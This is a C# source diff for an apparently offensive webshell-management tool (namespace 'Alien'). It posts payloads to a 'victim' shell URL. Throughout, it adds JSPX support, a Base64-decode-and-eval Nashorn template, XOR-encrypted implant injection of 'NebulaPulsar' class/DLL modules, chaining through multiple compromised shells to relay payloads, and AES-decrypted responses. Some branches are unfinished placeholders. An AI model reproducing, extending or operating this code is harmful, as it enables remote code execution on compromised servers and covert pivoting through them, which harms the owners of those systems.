@@ -14,6 +14,7 @@ using System.Text.RegularExpressions;
 using System.Text.Json.Nodes;
 using System.Text.Json.Serialization;
 using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
 namespace Alien
 {
@@ -28,6 +29,7 @@ namespace Alien
         public clsVictim m_victim { get; init; }
         public clsTamper m_tamper { get; set; }
         public HttpClient m_clnt { get; set; }
+        private HttpClientHandler m_handler;
         private clsSqlite m_sqlConn { get; init; }
 
         private AesGcm m_aesgcm { get; set; }
@@ -133,6 +135,13 @@ namespace Alien
                     _ => fnWrapJSP
                 }
             },
+            {
+                enLanguage.JSPX,
+                type => type switch
+                {
+                    _ => fnWrapJSP
+                }
+            }
         };
 
         /// <summary>
@@ -191,6 +200,13 @@ namespace Alien
             },
             {
                 enLanguage.JSP,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            },
+            {
+                enLanguage.JSPX,
                 new string[]
                 {
                     "<%", "%>",
@@ -268,6 +284,19 @@ namespace Alien
                 {
                     if (type == "Nashorn")
                         return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
+                    else if (type == "NebulaPulsar")
+                        return string.Empty;
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.JSPX, (type) =>
+                {
+                    if (type == "Nashorn")
+                        return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
+                    else if (type == "NebulaPulsar")
+                        return string.Empty;
 
                     return null;
                 }
@@ -287,6 +316,7 @@ namespace Alien
             { enLanguage.Perl, "print \"[SPLITTER]\";" },
             { enLanguage.Ruby, "print \"[SPLITTER]\";" },
             { enLanguage.JSP, "echo(\"[SPLITTER]\");" },
+            { enLanguage.JSPX, "echo(\"[SPLITTER]\");" },
             //{ enLanguage.CFM, "writeOutput(\"[SPLITTER]\");" }
         };
 
@@ -297,7 +327,8 @@ namespace Alien
             { enLanguage.ASPX, clsEzData.fnszStre2b64 },
             { enLanguage.ASHX, clsEzData.fnszStre2b64 },
             { enLanguage.ASMX, clsEzData.fnszStre2b64 },
-            { enLanguage.JSP, szInput => szInput } // nop
+            { enLanguage.JSP, szInput => szInput }, // nop
+            { enLanguage.JSPX, szInput => szInput } // nop
         };
 
         public clsWeb(clsVictim victim, clsTamper tamper, clsSqlite sqlConn)
@@ -309,7 +340,7 @@ namespace Alien
             m_sqlConn = sqlConn;
 
             var cookieContainer = new CookieContainer();
-            var handler = new HttpClientHandler()
+            m_handler = new HttpClientHandler()
             {
                 CookieContainer = cookieContainer,
                 UseCookies = true,
@@ -327,15 +358,15 @@ namespace Alien
                 string szUsername = m_iniMgr.ReadString("Proxy", "Username");
                 string szPassword = m_iniMgr.ReadString("Proxy", "Password");
 
-                handler.Proxy = new WebProxy(szURL)
+                m_handler.Proxy = new WebProxy(szURL)
                 {
                     BypassProxyOnLocal = false
                 };
 
-                handler.UseProxy = true;
+                m_handler.UseProxy = true;
             }
 
-            m_clnt = new HttpClient(handler)
+            m_clnt = new HttpClient(m_handler)
             {
                 BaseAddress = new Uri(m_victim.ShellURL),
                 Timeout = TimeSpan.FromMilliseconds(m_victim.m_ShellConfig.nTimeout),
@@ -632,6 +663,12 @@ namespace Alien
                         "application/json"
                     );
                 }
+                else if (config.payloadType == enPayloadType.DarkMatter)
+                {
+                    // Inject NebulaPulsar first
+
+                    
+                }
                 else
                 {
                     // OneShell
@@ -641,6 +678,16 @@ namespace Alien
                         Encoding.GetEncoding(config.szEncoding),
                         config.bEHEnable ? "text/plain" : "application/x-www-form-urlencoded"
                     );
+                }
+
+                var uri = new Uri(config.szUrl);
+                string cookieHeader = m_handler.CookieContainer.GetCookieHeader(uri);
+                if (!string.IsNullOrEmpty(cookieHeader))
+                {
+                    if (m_clnt.DefaultRequestHeaders.Contains("Cookie"))
+                        m_clnt.DefaultRequestHeaders.Remove("Cookie");
+
+                    m_clnt.DefaultRequestHeaders.Add("Cookie", cookieHeader);
                 }
 
                 resp = await m_clnt.PostAsync(config.szUrl, content);
@@ -662,6 +709,10 @@ namespace Alien
                             s = szRespContent.Split(split);
                             if (s.Length > 1)
                                 szRespContent = s[1];
+                        }
+                        else if (c.payloadType == enPayloadType.DarkMatter)
+                        {
+                            MessageBox.Show("XXX");
                         }
                     }
 
@@ -977,6 +1028,32 @@ namespace Alien
             return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter, bShowError);
         }
 
+        private async Task<string?> fnInjectNebulaPulsar(stShellConfig config)
+        {
+            try
+            {
+                string szKey = config.szPassword;
+                string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
+                byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
+
+                byte[]? abNebulaPulsar = fnGetNebulaPulsar(config);
+                if (abNebulaPulsar == null)
+                    throw new Exception("NebulaPulsar is null or empty.");
+
+                byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);
+
+
+
+                return null;
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+                return string.Empty;
+            }
+        }
+
         private async Task<string> fnNebulaPulsar(string szPayloadName, string[] asParams, bool bShowError = true)
         {
             try
@@ -994,15 +1071,35 @@ namespace Alien
 
                     byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);
 
-                    using (var content = new ByteArrayContent(abEncryptedImplant))
+                    if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
                     {
-                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
-                        {
-                            CharSet = m_victim.ShellEncoding,
-                        };
+                        var lsConfig = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
+                        lsConfig.Reverse();
 
-                        HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
-                        resp.EnsureSuccessStatusCode();
+                        var result = await fnDriftingComet(lsConfig, Convert.ToBase64String(abEncryptedImplant));
+                        string? szFinalImplantPayload = result.config.bEHEnable ? result.szComet : (result.szComet.Contains("=") ? result.szComet : $"{result.config.szPassword}={Uri.EscapeDataString(result.szComet)}");
+
+                        if (string.IsNullOrEmpty(szFinalImplantPayload))
+                            return string.Empty;
+
+                        using (var content = new StringContent(szFinalImplantPayload, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded"))
+                        {
+                            HttpResponseMessage resp = await m_clnt.PostAsync(result.szURL, content);
+                            resp.EnsureSuccessStatusCode();
+                        }
+                    }
+                    else
+                    {
+                        using (var content = new ByteArrayContent(abEncryptedImplant))
+                        {
+                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
+                            {
+                                CharSet = m_victim.ShellEncoding,
+                            };
+
+                            HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
+                            resp.EnsureSuccessStatusCode();
+                        }
                     }
 
                     m_bInjectedNebularPulsar = true;
@@ -1018,6 +1115,62 @@ namespace Alien
                     lsConfig.Reverse();
 
                     var result = await fnDriftingComet(lsConfig, Convert.ToBase64String(abDarkMatter));
+
+                    List<string> lsSplitter = result.lsSplitter;
+                    lsSplitter.Reverse();
+                    lsConfig.Reverse();
+
+                    Dictionary<stShellConfig, string> dicSplitter = new Dictionary<stShellConfig, string>();
+                    for (int i = 0; i < lsSplitter.Count; i++)
+                        dicSplitter.Add(lsConfig[i], lsSplitter[i]);
+
+                    string szFinalPayload = string.Empty;
+
+                    if (!result.config.bEHEnable)
+                    {
+                        int idxFirstEq = result.szComet.IndexOf('=');
+                        if (idxFirstEq == -1)
+                            throw new Exception("Invalid comet payload format.");
+
+                        string szPass = result.szComet.Substring(0, idxFirstEq);
+                        string szRealPayload = result.szComet.Substring(idxFirstEq + 1);
+                        szFinalPayload = $"{szPass}={szRealPayload}";
+                    }
+                    else
+                    {
+                        szFinalPayload = result.szComet;
+                    }
+
+                    using (var content = new StringContent(szFinalPayload, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded"))
+                    {
+                        HttpResponseMessage resp = await m_clnt.PostAsync(result.szURL, content);
+                        resp.EnsureSuccessStatusCode();
+
+                        string szRespContent = await resp.Content.ReadAsStringAsync();
+
+                        foreach (var kvp in dicSplitter)
+                        {
+                            stShellConfig currentConfig = kvp.Key;
+                            string szCurrentSplitter = $"[{kvp.Value}]";
+
+                            if (!szRespContent.Contains(szCurrentSplitter))
+                                throw new Exception("Comet response splitter mismatch.");
+
+                            string[] splits = szRespContent.Split(new string[] { szCurrentSplitter }, StringSplitOptions.None);
+                            if (splits.Length != 3)
+                                throw new Exception("Invalid comet response split structure.");
+
+                            szRespContent = splits[1];
+                        }
+
+                        byte[] abEncResp = Convert.FromBase64String(szRespContent);
+                        byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);
+
+                        Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
+                        string szResp = encoding.GetString(abResp);
+
+                        return szResp;
+                    }
                 }
 
                 using (var content = new ByteArrayContent(abDarkMatter))
@@ -1048,12 +1201,33 @@ namespace Alien
             }
         }
 
-        private async Task<(stShellConfig config, string? szURL, string? szComet, List<string>? lsSplitter)> fnDriftingComet(List<stShellConfig> lsConfig, string? szPayload)
+        private bool Isbase64String(string s)
         {
-            if (string.IsNullOrEmpty(szPayload))
+            s = s.Trim();
+            if (s.Length % 4 != 0) return false;
+            return Regex.IsMatch(s, @"^[a-zA-Z0-9\+/]*={0,3}$", System.Text.RegularExpressions.RegexOptions.None);
+        }
+
+        private async Task<(stShellConfig config, string? szURL, string? szComet, List<string>? lsSplitter)> fnDriftingComet(List<stShellConfig> lsConfig, object payload)
+        {
+            if (payload == null)
                 throw new Exception("Payload is null or empty");
 
-            string? szCurrentPayload = szPayload;
+            string? szCurrentPayload = string.Empty;
+            if (payload is byte[] abPayload)
+            {
+                if (abPayload.Length == 0) throw new Exception("Payload bytes are empty");
+                szCurrentPayload = Convert.ToBase64String(abPayload);
+            }
+            else if (payload is string szStrPayload)
+            {
+                if (string.IsNullOrEmpty(szStrPayload)) throw new Exception("Payload string is empty");
+                szCurrentPayload = szStrPayload;
+            }
+            else
+            {
+                throw new Exception("Invalid payload type");
+            }
 
             stShellConfig finalTargetConfig = new stShellConfig();
             string szFinalURL = string.Empty;
@@ -1068,7 +1242,23 @@ namespace Alien
                 var nextConfig = i == 0 ? m_victim.m_ShellConfig : lsConfig[i - 1];
 
                 string szSplitter = clsEzData.fnszGenerateRandomStr();
-                string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
+                string szCurrentTemplate = string.Empty;
+
+                if (config.payloadType == enPayloadType.DarkMatter)
+                {
+                    byte[]? abDarkMatterTemplate = fnGetDarkMatter(config, "comet", new string[0]);
+                    if (abDarkMatterTemplate == null)
+                        throw new Exception("Comet DarkMatter template is null or empty.");
+
+                    Encoding encoding = !string.IsNullOrEmpty(config.szEncoding)
+                        ? Encoding.GetEncoding(config.szEncoding)
+                        : Encoding.UTF8;
+                    szCurrentTemplate = encoding.GetString(abDarkMatterTemplate);
+                }
+                else
+                {
+                    szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
+                }
 
                 if (string.IsNullOrEmpty(szCurrentTemplate))
                     throw new Exception("Comet payload is null or empty");
@@ -1079,8 +1269,9 @@ namespace Alien
                         config,
                         szCurrentTemplate,
                         new string[] {
-                            clsEzData.fnszStre2b64(szNextUrl),
-                            clsEzData.fnszStre2b64(szCurrentPayload)
+                    clsEzData.fnszStre2b64(szNextUrl),
+                    clsEzData.fnszStre2b64(szCurrentPayload),
+                    clsEzData.fnszStre2b64("binary")
                         },
                         config.language
                     );
@@ -1097,8 +1288,9 @@ namespace Alien
                         config,
                         szCurrentTemplate,
                         new string[] {
-                            clsEzData.fnszStre2b64(szNextUrl),
-                            clsEzData.fnszStre2b64(szCurrentPayload)
+                    clsEzData.fnszStre2b64(szNextUrl),
+                    clsEzData.fnszStre2b64(szCurrentPayload),
+                    nextConfig.payloadType == enPayloadType.DarkMatter ? clsEzData.fnszStre2b64("binary") : clsEzData.fnszStre2b64("text")
                         },
                         config.language
                     );
@@ -1221,17 +1413,32 @@ namespace Alien
             return File.ReadAllBytes(szPath);
         }
 
+        private byte[]? fnGetNebulaPulsar(stShellConfig config)
+        {
+            string? szLang = Enum.GetName(typeof(enLanguage), config.language);
+            if (string.IsNullOrEmpty(szLang))
+                return null;
+
+            bool bIsJava = config.language == enLanguage.JSP || config.language == enLanguage.JSPX || config.language == enLanguage.CFM;
+
+            string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", "NebulaPulsar." + (bIsJava ? "class" : "dll"));
+            if (!Path.Exists(szPath))
+                return null;
+
+            return File.ReadAllBytes(szPath);
+        }
+
         /// <summary>
         /// Payload module of NebulaPulsar
         /// </summary>
         /// <returns></returns>
-        private byte[]? fnGetDarkMatter(string szName)
+        private byte[]? fnGetDarkMatter(stShellConfig config, string szName)
         {
-            string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
+            string? szLang = Enum.GetName(typeof(enLanguage), config.language);
             if (string.IsNullOrEmpty(szLang))
                 return null;
 
-            bool bIsJava = m_victim.ShellLanguage == enLanguage.JSP || m_victim.ShellLanguage == enLanguage.JSPX || m_victim.ShellLanguage == enLanguage.CFM;
+            bool bIsJava = config.language == enLanguage.JSP || config.language == enLanguage.JSPX || config.language == enLanguage.CFM;
             
             string szPath = Path.Combine(Application.StartupPath, "Payload", szLang, "NebulaPulsar", "DarkMatter", szName + "." + (bIsJava ? "class" : "dll"));
             if (!Path.Exists(szPath))
@@ -1252,7 +1459,7 @@ namespace Alien
 
             string szParams = string.Join("&", asParams);
 
-            byte[]? abDarkMatter = fnGetDarkMatter(szName);
+            byte[]? abDarkMatter = fnGetDarkMatter(config, szName);
             if (abDarkMatter == null)
                 throw new Exception("DarkMatter is null or empty.");
 
